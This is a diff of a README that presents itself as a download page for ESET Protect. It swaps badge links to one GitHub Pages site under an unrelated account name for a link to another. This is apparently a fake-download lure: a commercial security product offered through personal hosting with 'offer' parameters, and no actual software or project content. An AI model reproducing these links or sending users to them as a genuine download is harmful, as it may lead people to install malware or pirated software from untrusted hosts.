@@ -1,18 +1,7 @@
 # ESET Protect Download — Security Platform
 
-<a href="https://io-app-git.github.io/.github/?offer=ESETProtect" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/ESET%20Protect%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="ESET Protect for macOS">
-</a>
+[![GET ESET Protect](https://img.shields.io/badge/GET%20%E2%80%94%20ESET-Protect-0078D6?style=for-the-badge&logoColor=white)](https://rubicolagiovanni372.github.io/.github/ESET-Protect)
 
-<a href="https://io-app-git.github.io/.github/?offer=ESETProtect" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/ESET%20Protect%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="ESET Protect for Windows">
-</a>
 
 ---
 
